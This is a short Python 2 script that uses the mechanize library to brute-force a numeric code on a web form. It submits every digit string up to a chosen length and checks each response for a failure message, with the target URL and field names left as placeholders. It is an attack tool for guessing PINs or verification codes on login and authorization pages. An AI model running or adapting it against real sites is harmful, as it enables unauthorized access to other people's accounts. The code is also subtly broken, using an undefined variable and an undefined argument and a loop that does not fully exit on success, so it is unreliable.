import re
from mechanize import Browser
from itertools import permutations

# Loads a form using the mechanize python plugin, guesses different integer values until it finds the correct one.

def authorize(n):

	number = "0"

	# Permutations of sizes between 1 and n!
	for k in range(1, n):

		# generates permutations of the string

		# add n copies of each number to the the list, allows for 0000 or 1111 (permutations with repeated digits)

		perms = [''.join(p) for p in permutations('0123456789' * n, k)]
		print "Printing permutations for k = " + str(k)

		# create a set to remove any possible duplicates that result from having multiple copies of the same number
		perms = set(perms)

		for permutation in perms:

			br = Browser()
			br.open("<URL_GOES_HERE>")

			# if a page has multiple forms, change the index the index appropriately
			# e.g. the 4th form would have index 3
			br.form = list(br.forms())[0]

			print "Trying permutation: " + permutation

			# copy and paste this line to fill in all the fields
			br.form["<FIELD_NAME>"] = "<VALUE_FOR_FIELD>"

			# the line that guesses at the field
			br.form["<NAME_OF_CODE_FIELD>"] = permutation

			# prints the finished form, can remove to reduce I/O costs
			print br.form

			# submits the form and grabs the html page after the submit
			response = br.submit()
			htmlFile = response.get_data()

			# most websites display a message if the code is not successful, replace the field below with this
			# searches for the error/failure message in the returned html page
			# if it doesn't find it, the permutation worked! otherwise resets the form

			if "<FAILURE_MESSAGE>" not in htmlFile:
				number = perm
				break
			else:
				br.back()
	return number

# call the function, supply input n
authorize(n);
